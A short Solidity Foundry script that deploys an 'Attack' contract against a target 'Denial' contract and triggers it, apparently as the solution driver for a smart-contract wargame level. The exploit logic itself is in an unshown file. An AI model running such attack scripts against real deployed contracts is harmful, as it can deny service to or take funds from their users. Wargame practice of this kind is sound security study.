// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {Denial} from "src/Denial.sol";
import {Attack} from "src/Attack.sol";

contract AttackScript is Script {
    function run() public {
        address deployer = vm.rememberKey(vm.envUint("PRIVATE_KEY"));

        vm.startBroadcast(deployer);

        Denial denial = Denial(payable(vm.envAddress("DENIAL")));
        Attack attack = new Attack(address(denial));
        attack.attack();

        vm.stopBroadcast();
    }
}
